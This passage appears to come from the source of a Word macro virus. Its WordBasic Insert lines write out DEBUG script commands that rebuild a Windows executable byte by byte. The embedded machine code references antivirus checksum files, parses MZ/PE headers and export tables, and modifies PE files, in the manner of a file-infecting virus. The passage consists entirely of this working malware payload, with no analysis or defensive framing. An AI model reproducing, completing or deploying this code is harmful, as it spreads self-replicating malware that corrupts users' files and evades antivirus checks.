WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e40 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ea0 64 72 6f 6c 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ec0 41 56 50 2e 43 52 43 00 49 56 50 2e 4e 54 5a 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ed0 41 6e 74 69 2d 56 69 72 2e 44 41 54 00 43 48 4b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ee0 4c 69 73 74 2e 4d 53 00 43 48 4b 4c 69 73 74 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ef0 43 50 53 00 53 6d 61 72 74 43 48 4b 2e 4d 53 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f00 53 6d 61 72 74 43 48 4b 2e 43 50 53 00 ff c0 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f10 40 00 c8 17 40 00 d0 17 40 00 dd 17 40 00 e8 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f20 40 00 f4 17 40 00 00 18 40 00 0d 18 40 00 9c 60 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f30 e8 00 00 00 00 5d 81 ed 35 18 40 00 89 ad d6 19 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f40 40 00 e8 50 0c 00 00 8d 85 c6 19 40 00 50 64 67 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f50 ff 36 00 00 64 67 89 26 00 00 8b 44 24 2c 39 80 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f60 b4 00 00 00 74 1b 48 3d 00 00 00 40 76 02 eb ee " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f70 b8 00 00 f7 bf 66 81 38 4d 5a 74 05 b8 00 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f80 7f 89 85 8e 13 40 00 8b f8 66 81 3f 4d 5a 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f90 30 01 00 00 8b 7f 3c 03 bd 8e 13 40 00 66 81 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fa0 50 45 0f 85 1c 01 00 00 60 8b 77 78 03 b5 8e 13 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fb0 40 00 89 b5 a8 13 40 00 83 c6 10 ad 89 85 ac 13 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fc0 40 00 ad ad 89 85 b0 13 40 00 03 85 8e 13 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fd0 ad 03 85 8e 13 40 00 89 85 b4 13 40 00 ad 03 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fe0 8e 13 40 00 89 85 b8 13 40 00 ad 03 85 8e 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ff0 00 89 85 bc 13 40 00 8b b5 b4 13 40 00 ad 03 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1000 8e 13 40 00 8b b5 b8 13 40 00 89 b5 c0 13 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1010 8b 3e 03 bd 8e 13 40 00 b9 00 00 00 00 bb 0b 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1020 40 00 03 dd 8b f3 a6 75 07 80 3f 00 74 28 eb f6 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1030 66 41 66 3b 8d b0 13 40 00 0f 8d 85 00 00 00 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1040 85 c0 13 40 00 04 8b b5 c0 13 40 00 8b 3e 03 bd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1050 8e 13 40 00 eb ce 8b de 43 d1 e1 8b b5 bc 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1060 00 03 f1 33 c0 66 8b 06 c1 e0 02 8b b5 b4 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1070 00 03 f0 8b 3e 03 bd 8e 13 40 00 89 bd 95 11 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1080 00 61 be 1a 10 40 00 bf 99 11 40 00 03 f5 03 fd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1090 56 8b 85 8e 13 40 00 50 ff 95 95 11 40 00 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10a0 00 74 21 ab 46 80 3e 00 75 fa 46 80 3e ff 75 e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10b0 83 fd 00 74 05 e8 c0 05 00 00 e8 53 00 00 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10c0 6c 00 00 00 eb 04 8b 64 24 08 64 67 8f 06 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10d0 83 c4 04 61 57 bf 00 00 00 00 83 ff 00 74 28 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10e0 87 c4 13 40 00 03 87 a0 13 40 00 50 53 8d 9f 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10f0 1a 40 00 2b c3 83 e8 04 89 87 03 1a 40 00 5b 58 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1100 5f 9d e9 00 00 00 00 83 c4 04 6a 00 ff 97 99 11 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1110 40 00 6a 00 ff 95 bd 11 40 00 83 f8 03 75 09 c6 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1120 85 44 17 40 00 01 eb 07 c6 85 44 17 40 00 00 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1130 68 80 00 00 00 8d 85 f0 14 40 00 50 ff 95 e5 11 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1140 40 00 68 80 00 00 00 8d 85 18 16 40 00 50 ff 95 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1150 e9 11 40 00 8d 85 c8 13 40 00 50 68 80 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1160 ff 95 a5 11 40 00 80 bd 44 17 40 00 00 74 0f c7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1170 85 40 17 40 00 03 00 00 00 e8 4b 00 00 00 83 fd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1180 00 74 38 8d 85 f0 14 40 00 50 ff 95 ed 11 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1190 c7 85 40 17 40 00 03 00 00 00 e8 2a 00 00 00 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11a0 85 18 16 40 00 50 ff 95 ed 11 40 00 c7 85 40 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11b0 40 00 03 00 00 00 e8 0e 00 00 00 8d 85 c8 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11c0 00 50 ff 95 ed 11 40 00 c3 8d bd 3d 12 40 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11d0 c7 50 8d 85 05 10 40 00 50 ff 95 9d 11 40 00 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11e0 f8 ff 74 50 50 8d 77 2c 8b 4f 20 e8 4a 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11f0 72 10 ff 8d 40 17 40 00 66 83 bd 40 17 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1200 74 2a 58 50 57 50 ff 95 a1 11 40 00 85 c0 74 1c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1210 8d 77 2c 8b 4f 20 e8 1f 00 00 00 72 06 ff 8d 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1220 17 40 00 83 bd 40 17 40 00 00 75 d6 58 50 ff 95 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1230 c5 11 40 00 e8 e4 08 00 00 c3 60 89 8d 71 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1240 00 66 c7 85 79 17 40 00 00 00 81 c1 d9 14 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1250 81 c1 00 10 00 00 89 8d 4d 17 40 00 89 b5 55 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1260 40 00 56 ff 95 b5 11 40 00 83 f8 00 74 06 89 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1270 51 17 40 00 68 80 00 00 00 56 ff 95 b9 11 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1280 6a 00 6a 00 6a 03 6a 00 6a 01 68 00 00 00 c0 56 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1290 ff 95 c1 11 40 00 89 85 49 17 40 00 83 f8 ff 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12a0 84 c4 03 00 00 bb 59 17 40 00 03 dd 53 83 c3 08 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12b0 53 83 c3 08 53 50 ff 95 c9 11 40 00 6a 00 ff b5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12c0 49 17 40 00 ff 95 d5 11 40 00 89 85 71 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12d0 6a 00 ff b5 4d 17 40 00 6a 00 6a 04 6a 00 ff b5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12e0 49 17 40 00 ff 95 a9 11 40 00 89 85 45 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12f0 83 f8 00 0f 84 12 03 00 00 ff b5 4d 17 40 00 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1300 00 6a 00 6a 02 50 ff 95 ad 11 40 00 83 f8 00 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1310 84 ea 02 00 00 8b f0 89 b5 75 17 40 00 66 81 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1320 4d 5a 0f 85 c2 02 00 00 66 81 7e 12 52 44 0f 84 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1330 b6 02 00 00 8b 7e 3c 81 ff 00 10 00 00 0f 87 a7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1340 02 00 00 03 fe 66 81 3f 50 45 0f 85 9a 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1350 89 bd 7b 17 40 00 66 8b 47 16 66 a9 00 20 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1360 86 02 00 00 83 c7 18 8b 47 24 89 85 83 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1370 8b 47 20 89 85 87 17 40 00 8b 47 10 89 85 c4 13 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1380 40 00 8b 47 1c 89 85 a0 13 40 00 8b 87 88 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1390 00 89 85 b4 17 40 00 8b 47 70 89 85 b8 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13a0 8b 5f 5c c1 e3 03 33 c0 66 8b 47 ee 48 b9 28 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13b0 00 00 f7 e1 8b b5 7b 17 40 00 83 c6 18 83 c6 60 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13c0 03 f3 03 f0 8b 46 0c 89 85 a8 17 40 00 8b 8d b4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13d0 17 40 00 83 f9 00 74 10 3b c8 75 0c c7 85 b0 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13e0 40 00 01 00 00 00 eb 21 8b 8d b8 17 40 00 83 f9 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13f0 00 0f 84 f3 01 00 00 3b c8 0f 85 eb 01 00 00 c7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1400 85 b0 17 40 00 03 00 00 00 89 b5 7f 17 40 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1410 fe 83 c7 28 b9 28 00 00 00 f3 a4 ff 76 08 6a 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1420 ff 95 f5 11 40 00 0b c0 0f 84 bc 01 00 00 8b f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1430 8b 4e 08 51 8b 76 14 03 b5 75 17 40 00 56 f3 a4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1440 5f 8d b5 00 10 40 00 b9 d9 14 00 00 f3 a4 50 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1450 d9 14 00 00 8b 8d 83 17 40 00 50 51 33 d2 f7 f1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1460 59 81 c1 d9 14 00 00 2b ca 78 0b 89 8d 8b 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1470 00 58 b0 00 f3 aa 58 59 8b f0 81 ef d9 14 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1480 f3 a4 0f 23 c7 e8 cf 06 00 00 8b b5 7f 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1490 56 87 f7 8d b5 9f 17 40 00 b9 08 00 00 00 f3 a4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14a0 5e c7 46 24 40 00 00 c0 c7 46 08 d9 14 00 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14b0 85 8b 17 40 00 89 46 10 8b 5e 0c 53 03 d8 93 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14c0 8d 87 17 40 00 33 d2 f7 f1 40 f7 e1 93 83 c6 28 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14d0 01 46 14 53 8b 4e 0c 2b d9 89 9d bc 17 40 00 5b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14e0 89 5e 0c 89 9d ac 17 40 00 83 bd b0 17 40 00 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14f0 74 5b 8b 76 14 03 b5 75 17 40 00 8b fe 83 c7 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1500 e8 02 00 00 00 eb 46 33 c9 66 8b 4e 0c 66 03 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1510 0e 83 c6 10 51 56 e8 08 00 00 00 5e 59 83 c6 08 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1520 e2 f2 c3 8b 46 04 8b f7 a9 00 00 00 80 74 10 35 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1530 00 00 00 80 03 f0 83 ee 10 e8 c9 ff ff ff c3 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1540 f0 83 ee 10 8b 85 bc 17 40 00 01 06 c3 8b 85 71 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1550 17 40 00 05 d9 14 00 00 8b 8d 83 17 40 00 50 51 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1560 33 d2 f7 f1 59 2b ca 58 03 c1 89 85 71 17 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1570 0f 21 c1 2b 0d 75 17 40 00 2b c1 78 08 91 0f 21 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1580 c7 b0 00 f3 aa 8b b5 7b 17 40 00 ff 46 06 83 c6 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1590 18 5b 89 5e 10 8b 46 38 05 d9 14 00 00 8b 8d 87 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15a0 17 40 00 50 51 33 d2 f7 f1 59 2b ca 58 03 c1 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15b0 46 38 8b 9d a8 17 40 00 8d 76 60 b9 10 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15c0 ad 3b d8 75 0b 8b 85 ac 17 40 00 89 46 fc eb 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15d0 ad e2 ed 8b b5 75 17 40 00 66 c7 46 12 52 44 66 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15e0 c7 85 79 17 40 00 00 00 eb 09 66 c7 85 79 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15f0 00 ff 00 ff b5 75 17 40 00 ff 95 b1 11 40 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1600 b5 45 17 40 00 ff 95 c5 11 40 00 6a 00 6a 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1610 b5 71 17 40 00 ff b5 49 17 40 00 ff 95 d1 11 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1620 00 ff b5 49 17 40 00 ff 95 d9 11 40 00 bb 59 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1630 40 00 03 dd 53 83 c3 08 53 83 c3 08 53 ff b5 49 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1640 17 40 00 ff 95 cd 11 40 00 ff b5 49 17 40 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1650 95 c5 11 40 00 ff b5 51 17 40 00 ff b5 55 17 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1660 00 ff 95 b9 11 40 00 eb 03 f9 eb 0c 66 81 bd 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1670 17 40 00 ff 00 74 f2 f8 61 c3 60 8d 85 92 13 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1680 00 50 ff 95 e1 11 40 00 83 f8 00 0f 84 85 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1690 00 89 85 9c 13 40 00 8d 85 31 12 40 00 50 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16a0 9c 13 40 00 50 ff 95 95 11 40 00 83 f8 00 0f 84 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16b0 62 01 00 00 8b d8 8d 85 8f 17 40 00 8b f8 50 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16c0 95 dd 11 40 00 8b 47 04 25 00 00 ff ff c1 e8 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16d0 83 f8 07 0f 85 3d 01 00 00 68 30 10 00 00 8d 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16e0 18 21 40 00 50 8d 85 44 21 40 00 50 6a 00 ff d3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16f0 8d 85 fd 11 40 00 50 ff 95 e1 11 40 00 83 f8 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1700 0f 84 10 01 00 00 8b d8 8d 85 0a 12 40 00 50 53 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1710 ff 95 95 11 40 00 83 f8 00 0f 84 f7 00 00 00 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1720 85 29 12 40 00 8d 85 1a 12 40 00 50 53 ff 95 95 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1730 11 40 00 83 f8 00 0f 84 da 00 00 00 89 85 2d 12 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1740 40 00 68 80 00 00 00 8d 85 a2 21 40 00 50 ff 95 " + _
Chr(34) + "" + T$
